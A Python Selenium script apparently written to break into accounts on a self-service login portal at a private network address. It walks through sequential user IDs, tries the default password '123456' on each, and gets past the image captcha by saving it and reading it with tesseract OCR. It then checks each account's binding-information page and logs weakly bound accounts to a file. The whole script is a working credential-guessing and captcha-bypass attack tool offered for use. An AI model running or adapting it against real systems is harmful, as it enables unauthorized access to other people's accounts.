import os
import time
import requests
import pyautogui
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import UnexpectedAlertPresentException

op = webdriver.Chrome()
URL = 'http://172.16.254.82/selfLogon.do'
num = '0200'
wait = WebDriverWait(op, 10)
name = "JXJJXX"
valiable = list()

def nxt(num):
    res = int(num) + 1
    res = str(res)
    while len(res) < 4:
        res = '0' + res
    return res

def get_captcha():
    act = ActionChains(op)
    act.reset_actions()
    os.system("rm ~/Downloads/*.jpeg")
    print("getting captcha")
    img = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,"img[src=\"/servlet/AuthenCodeImage\"]")))
    act.context_click(img)
    act.perform()
    print("downloading the picture...")
    pyautogui.typewrite(['down', 'down', 'enter'])
    time.sleep(0.5)
    pyautogui.typewrite(['enter'])
    time.sleep(0.5)
    print("tesseracting...")
    os.system("tesseract ~/Downloads/AuthenCodeImage.jpeg res --psm 6")
    time.sleep(0.5)
    print("captcha = " + str(open("res.txt").read()))
    return open("res.txt").read()

def login(num):
    op.find_element_by_name("user_id").send_keys(name + num)
    op.find_element_by_name("passwd").send_keys("123456")
    time.sleep(2)
    op.find_element_by_name("validateCode").send_keys(get_captcha())

def work(num):
    try:
        op.get(URL)
    except:
        op.get(URL)
    print("work " + str(num))
    login(num)
    tmpqwq = 1
    not_ok = int()
    while 1:
        try:
            tmp = wait.until(EC.presence_of_element_located((By.NAME, "mainFrame")))
        except:
            print("wrong")
            login(num)
        else:
            break
        finally:
            tmpqwq += 1
            if tmpqwq == 3:
                not_ok = 1
                break
    if not_ok == 1:
        return 
    op.switch_to.frame(tmp)
    time.sleep(0.1)
    wait.until(EC.presence_of_element_located((By.LINK_TEXT, "绑定信息"))).click()
    time.sleep(0.1)
    ele = op.find_elements(By.CSS_SELECTOR, "[bgcolor=\"DAE1EF\"]+td")
    ans = int()
    for e in ele:
        _str = e.text
        for s in _str:
            if s == ':':
                ans += 1
    if ans < 15:
        return True
    else:
        return False    
    print(str(num) + " = " + str(ans))

if __name__ == '__main__':
    # 如果不存在 result.txt
    if not os.path.exists("result.txt") or os.path.getsize("result.txt") == 0:
        while 1:
            num = nxt(num)
            if work(num):
                with open("result.txt", 'a') as out:
                    out.write(str(num) + '\n')
            if int(num) > 240:
                break
    else:
        with open("result.txt", 'r') as out:
            for line in out.readlines():
                if not len(line):
                    continue
                valiable.append(line)
        for now in valiable:
            if work(now):
                with open("result.txt", 'w') as out:
                    out.write(now + '\n')
    op.quit()